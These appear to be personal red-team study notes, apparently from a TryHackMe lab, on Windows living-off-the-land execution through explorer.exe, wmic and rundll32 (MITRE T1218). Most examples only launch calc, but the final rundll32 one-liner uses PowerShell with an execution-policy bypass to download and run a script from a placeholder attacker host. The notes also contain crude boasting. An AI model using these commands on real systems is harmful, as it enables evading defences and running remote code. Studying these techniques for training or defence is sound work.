## Table of Contents

    - [**Signed Binary Proxy Execution** or **Indirect Command Execution**](#**Signed\Binary Proxy Execution** or **Indirect\Command\Execution**)
          - [To creata a chile process of explorer.exe as (parent). Execute the following:](#To\creata\a\chile\process\of\explorer.exe\as\(parent).\Execute\the\following:)
- [WMIC #windows #WMIC](#wmic\#windows\#wmic)
- [Rundll32 #rundll32 #windows #LoL #bypass #execution](#rundll32\#rundll32\#windows\#lol\#bypass\#execution)

#payload
#exiltrate 
#execution
#bypass
#iex
#LoL
#LivingOffTheLand 
#windows 
#WMIC 
### **Signed Binary Proxy Execution** or **Indirect Command Execution**
	Attacker leverages other system tools to spawn payloads to evade defensive controls
The explorer.exe binary is located at:  

- C:\Windows\explorer.exe
###### To creata a chile process of explorer.exe as (parent). Execute the following:
```powershell
C:\Users\Autist> explorer.exe /root,"C:\Windows\System32\calc.exe"
```
	calc pop gg get fucked #1337




# WMIC #windows #WMIC
	Command line util that manages windows components

The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution ([T1218](https://attack.mitre.org/techniques/T1218/))

Command Prompt

```powershell
C:\Users\thm> . . . \
wmic.exe process call create calc
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 1740;
        ReturnValue = 0;
};
C:\Users\thm>
```

The previous WMIC command creates a new process of a binary of our choice, which in this case calc.exe.


# Rundll32 #rundll32 #windows #LoL #bypass #execution 

Rundll32 is a Microsoft built-in tool that loads and runs Dynamic Link Library DLL files within the operating system. A red team can abuse and leverage rundll32.exe to run arbitrary payloads and execute JavaScript and PowerShell scripts. The MITRE ATT&CK framework identifies this as **Signed Binary Proxy Execution: Rundll32** and refers to it as [T1218](https://attack.mitre.org/techniques/T1218/011/).

Located at:
```powershell
C:\Windows\System32\rundll32.exe for 32-bit Version
C:\Windows\SysWOW64\rundll32.exe for 64-bit Version
```

Ex:
```powershell
C:\Users\thm> . . . \
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
\
```
	Uses embedded Javascript componenet eval() to execute the calc.exe binary

As we mentioned previously, we can also execute PowerShell scripts using the rundll32.exe. The following command runs a JavaScript that executes a PowerShell script to download from a remote website using rundll32.exe.

Command Prompt

```shell-session
C:\Users\thm> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```



















